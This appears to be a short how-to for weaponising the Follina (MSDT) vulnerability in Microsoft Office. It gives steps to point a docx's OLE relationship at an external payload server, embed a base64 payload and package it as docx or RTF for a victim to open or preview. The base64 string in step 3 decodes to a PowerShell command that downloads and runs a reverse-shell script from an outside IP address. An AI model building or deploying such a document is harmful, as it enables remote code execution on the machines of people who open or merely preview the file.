Based on https://packetstormsecurity.com/files/167317/Microsoft-Office-MSDT-Follina-Proof-Of-Concept.html
This exploit only works if Word is used to handle doc, docx and rtf format in windows.
1. File follina.docx is a dummy document with an (OLE) object (as a Bitmap Image). The file was unzipped to follina folder.
2.Edit `word/_rels/document.xml.rels` in follina folder. Modify the XML tag `<Relationship>` with attribute

```
Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject"
```

and `Target="embeddings/oleObject1.bin"` by changing the `Target` value and adding attribute `TargetMode`:

```
Target = "http://<payload_server>/payload.html!"
TargetMode = "External"
```

Note the Id value (probably it is "rId5").
3.  Edited file payload.html with a base64 payload for the target action (e.g. command execution or reverse shell). Only replace the base64 part as in the example below.
...[char]34+'SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8vMTkyLjE2OC4yNDUuMTMzL3Jldi5wczEiKSAg'+[char]34...
4. Zip content in follina folder into a docx payload. For RTF payload, open the resulting docx and save it as RTF file.
5. Start a web server to serve file payload.html and wait for victim to click or browse the payload
With RTF, there is no need to open the file in Word, it is enough to browse to the file and have a look at it in a preview pane. The preview pane triggers the external HTML payload and RCE is there without any clicks.